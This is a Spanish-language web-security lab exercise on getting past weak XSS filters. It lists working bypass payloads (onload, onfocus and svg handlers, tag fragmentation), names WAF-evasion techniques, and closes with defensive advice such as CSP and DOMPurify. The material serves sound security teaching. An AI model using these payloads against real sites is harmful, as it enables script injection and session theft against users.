🔓 Ejercicio 4: Bypass de Filtros

Evade filtros de seguridad débiles usando técnicas avanzadas

📋 Instrucciones

Esta página intenta protegerse contra XSS usando filtros básicos. Tu objetivo es encontrar formas de evadirlos.

  • Objetivo: Ejecutar JavaScript evadiendo los filtros
  • Tipo: Filter Bypass / WAF Evasion
  • Filtros activos: Bloquea <script>, javascript:, onerror (case-insensitive)
  • Desafío: Requiere creatividad y conocimiento de técnicas alternativas
🚫 Patrones Bloqueados

El sistema intenta bloquear estos patrones (pero puede ser evadido):

  • <script> - Etiqueta script
  • javascript: - Protocolo JavaScript
  • onerror - Evento onerror

⚠️ El filtro es case-insensitive pero tiene otras debilidades...

💡 Técnicas de Bypass Sugeridas

1. Case Variation (aunque el filtro sea case-insensitive):

<ScRiPt>alert('Bypass')</ScRiPt>

2. Eventos Alternativos:

<img src=x onload=alert('Bypass')>
<svg onload=alert('Bypass')>
<body onload=alert('Bypass')>
<input onfocus=alert('Bypass') autofocus>

3. Codificación de Caracteres:

<img src=x onload=alert('Bypass')>
<svg/onload=alert('Bypass')>

4. Espacios y Caracteres Especiales:

<img/src=x/onload=alert('Bypass')>
<svg%20onload=alert('Bypass')>

5. Fragmentación:

<scr<script>ipt>alert('Bypass')</script>

🎓 Explicación Técnica

¿Por qué fallan los filtros simples?

  • Blacklist incompleta: Imposible listar todos los vectores de ataque
  • Parsing diferente: El navegador interpreta HTML de formas inesperadas
  • Múltiples encodings: HTML entities, URL encoding, Unicode, etc.
  • Mutación del DOM: El navegador puede "corregir" HTML y crear vulnerabilidades
  • Context switching: Diferentes contextos (HTML, atributo, JavaScript) requieren diferentes sanitizaciones

🛡️ Bypass de WAF Reales

Técnicas usadas para evadir Web Application Firewalls profesionales:

  • Mutation XSS (mXSS): Explotar diferencias en parsing
  • HPP (HTTP Parameter Pollution): Enviar múltiples parámetros con el mismo nombre
  • UTF-7 encoding: Codificación antigua pero a veces efectiva
  • Polyglots: Payloads que funcionan en múltiples contextos
  • WAF-specific quirks: Cada WAF tiene sus debilidades únicas

🛡️ Defensa Correcta Contra XSS
  • NO usar blacklists: Usa whitelists y escape contextual
  • Content Security Policy: La mejor defensa en profundidad
  • Bibliotecas especializadas: DOMPurify, OWASP Java Encoder
  • Escape contextual: Diferente para HTML, atributos, JavaScript, CSS
  • HTTPOnly cookies: Prevenir robo de sesión
  • Trusted Types: API del navegador para prevenir XSS
  • Sanitización del servidor: Nunca confiar solo en el cliente
